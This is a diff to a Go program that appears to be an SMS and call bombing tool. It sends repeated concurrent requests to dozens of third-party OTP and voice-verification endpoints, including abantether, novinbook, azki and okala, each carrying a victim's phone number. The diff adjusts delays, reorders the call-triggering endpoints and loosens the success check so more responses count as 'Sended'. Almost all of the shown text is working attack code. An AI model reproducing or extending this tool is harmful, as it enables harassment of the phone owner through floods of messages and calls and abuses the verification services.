@@ -27,14 +27,16 @@ func clearScreen() {
 	cmd.Run()
 }
 func sms(url string, header map[string]interface{}, ch chan<- int) {
+	//time.Sleep(3 * time.Second)
 	jsonData, err := json.Marshal(header)
 	if err != nil {
 		fmt.Println("\033[01;31m[-] Error ! ")
 		ch <- http.StatusInternalServerError
 		return
 	}
-	time.Sleep(1 * time.Second)
+	time.Sleep(3 * time.Second)
 	resp, err := http.Post(url, "application/json", bytes.NewBuffer(jsonData))
+	time.Sleep(3 * time.Second)
 	if err != nil {
 		fmt.Println("\033[01;31m[-] Error ! ")
 		ch <- http.StatusInternalServerError
@@ -115,7 +117,13 @@ func main() {
 		go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
 			"phoneNumber": phone,
 		}, ch)
-
+		s57 := fmt.Sprintf("phone=%s&call=yes", phone)
+		go sms("https://novinbook.com/index.php?route=account/phone", map[string]interface{}{
+			s57: phone,
+		}, ch)
+		go sms(fmt.Sprintf("https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=%s", phone), map[string]interface{}{
+			"esfelurm": "esfelurm",
+		}, ch)
 		go sms("https://api.pooleno.ir/v1/auth/check-mobile", map[string]interface{}{
 			"mobile": phone,
 		}, ch)
@@ -685,7 +693,6 @@ func main() {
 		go sms("https://api-react.okala.com/C/CustomerAccount/OTPRegister", map[string]interface{}{
 			s56: phone,
 		}, ch)
-		// call
 		go sms("https://client.api.paklean.com/user/resendVoiceCode", map[string]interface{}{
 			"username": phone,
 		}, ch)
@@ -698,22 +705,15 @@ func main() {
 		go sms("https://gateway.trip.ir/api/Totp", map[string]interface{}{
 			"PhoneNumber": phone,
 		}, ch)
-		s57 := fmt.Sprintf("phone=%s&call=yes", phone)
-		go sms("https://novinbook.com/index.php?route=account/phone", map[string]interface{}{
-			s57: phone,
-		}, ch)
-		go sms(fmt.Sprintf("https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=%s", phone), map[string]interface{}{
-			"esfelurm": "esfelurm",
-		}, ch)
 
 	}
 
 	for i := 0; i < repeatCount*183; i++ {
 		statusCode := <-ch
-		if statusCode == 200 || statusCode == 400 || statusCode == 422 {
-			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
-		} else {
+		if statusCode == 404 || statusCode == 400 {
 			fmt.Println("\033[01;31m[-] Error ! ")
+		} else {
+			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
 		}
 
 	}
